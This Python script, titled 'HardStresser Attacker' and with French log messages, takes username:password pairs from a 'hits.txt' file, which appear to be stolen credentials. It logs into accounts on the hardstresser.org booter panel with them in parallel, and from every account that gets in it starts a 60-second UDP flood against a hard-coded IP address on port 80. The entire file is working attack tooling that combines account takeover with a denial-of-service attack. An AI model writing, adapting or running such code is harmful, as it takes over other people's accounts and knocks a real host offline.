import requests
from bs4 import BeautifulSoup
import concurrent.futures
import threading
import re

lock = threading.Lock()

def parse_hits(file="hits.txt"):
    logins = []
    try:
        with open(file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(":")
                if len(parts) >= 2:
                    username = parts[0]
                    password = parts[1]
                    logins.append((username, password))
    except FileNotFoundError:
        print(f"[!] Fichier hits.txt introuvable")
    return logins

def launch_attack(session, html_username):
    try:
        attack_res = session.get(
            "https://hardstresser.org/panel/includes/ajax/user/attacks/hub.php",
            params={
                "type": "start",
                "host": "91.170.86.224",
                "port": "80",
                "time": "60",
                "method": "UDP",
                "vip": "0"
            },
            headers={
                "Referer": "https://hardstresser.org/panel/booter.php",
                "X-Requested-With": "XMLHttpRequest",
            },
            timeout=10
        )
        print(f"[*] {html_username} -> {attack_res.text.strip()}")
    except Exception as e:
        print(f"[!] Attack erreur {html_username}: {e}")

def check_and_attack(username, password):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        })

        res = session.post(
            "https://hardstresser.org/panel/login.php",
            data={"kullaniciadi": username, "sifreniz": password},
            timeout=10,
            allow_redirects=True
        )

        if "username" not in session.cookies:
            print(f"[-] {username} - FAIL")
            return

        html_username = session.cookies.get("username", "")
        print(f"[+] {html_username} connecte -> attaque...")
        launch_attack(session, html_username)

    except Exception as e:
        print(f"[!] Erreur {username} - {e}")

if __name__ == "__main__":
    print("=== HardStresser Attacker ===\n")

    logins = parse_hits()
    print(f"[*] {len(logins)} comptes charges depuis hits.txt")
    print(f"[*] Lancement avec 3 threads...\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(check_and_attack, u, p) for u, p in logins]
        concurrent.futures.wait(futures)

    print(f"\n[+] Termine !")
